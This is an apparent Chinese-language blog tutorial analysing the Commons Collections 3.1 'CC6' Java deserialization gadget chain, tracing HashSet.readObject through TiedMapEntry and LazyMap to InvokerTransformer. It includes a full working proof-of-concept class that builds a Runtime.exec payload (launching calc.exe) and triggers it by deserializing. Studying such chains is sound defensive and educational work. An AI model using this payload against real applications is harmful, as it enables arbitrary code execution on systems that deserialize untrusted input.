  

## CommonsCollections6 （CC6链）

## 说明

### 导入依赖

    
    
    <dependency>  
    <groupId>commons-collections</groupId>  
    <artifactId>commons-collections</artifactId>  
    <version>3.1</version>  
    </dependency>

### 利用链

    
    
    HashSet.readObject()  
    HashMap.put()  
      HashMap.hash()  
         TiedMapEntry.hashCode()  
            TiedMapEntry.getValue()  
               LazyMap.get()  
                  ChainedTransformer.transform()  
       ConstantTransformer.transform()  
                     InvokerTransformer.transform()

### ysoserial简化后的payload

    
    
    package com.ysoserial;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.keyvalue.TiedMapEntry;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.HashMap;  
    import java.util.HashSet;  
    import java.util.Map;  
    ​  
    public class CommonCollections6 {  
    public static void main(String[] args) throws IOException, ClassNotFoundException {  
    ​  
    ​  
        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
        });  
    ​  
        Map map=  LazyMap.decorate(new HashMap(),chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map,1);  
    ​  
        HashSet hashSet = new HashSet();  
        hashSet.add(tiedMapEntry);  
    ​  
    ​  
        //序列化  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(hashSet);  
        byteArrayOutputStream.flush();  
        byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
        //反序列化  
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
        objectInputStream.readObject();  
    ​  
    ​  
    }  
    public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {  
        Field field1 = obj.getClass().getDeclaredField(field);  
        field1.setAccessible(true);  
        field1.set(obj,value);  
    }  
    }

## 分析正文

source是HashSet的readObject()方法

![1650506353_6260ba713ff82a2d0d4f1.png!small?1650506353591](https://image.3001.net/images/20220421/1650506353_6260ba713ff82a2d0d4f1.png!small?1650506353591)

最后的循环是依次将读取的对象放入HashMap，读取的对象是HashSet的元素

然后调用HashMap的put方法

![image-20220420002703769](https://image.3001.net/images/20220420/1650435571_625fa5f3b76fe3f2f34d9.png!small)

put方法又调用自身的hash方法，

![image-20220420002741087](https://image.3001.net/images/20220420/1650435582_625fa5fe927fa0104e772.png!small)

hash方法去调用k的hashCode方法，而k就是之前我们说过的读取对象，就是HashSet的元素，我们可以存入TiedMapEntry类的对象

    
    
    HashSet hashSet = new HashSet();  
    hashSet.add(tiedMapEntry);

所以他k.hashCode()实际就会去调用TiedMapEntry.hashCode方法

![image-20220420003012331](https://image.3001.net/images/20220420/1650435710_625fa67e6ca20f29ea445.png!small)

他这个hashCode方法里又调用了自身的getValue方法

![image-20220420003047211](https://image.3001.net/images/20220420/1650435772_625fa6bc284b057470fe3.png!small)

所以我们在创建TiedMapEntry可以指定他的map属性为LazyMap，这样他就会去调用LazyMap的get的方法

![image-20220420003208946](https://image.3001.net/images/20220420/1650435854_625fa70eed0d3e4a32d14.png!small)

LazyMap的get方法又调用了transform方法，我们在创建LazyMap的时候可以指定他的factory为ChainedTransformer，这样就可以触发那条利用链，达到任意代码执行

分析结束

构造payload

执行

召唤神兽！

![image-20220420003443536](https://image.3001.net/images/20220420/1650435870_625fa71e91cb77284c290.png!small)

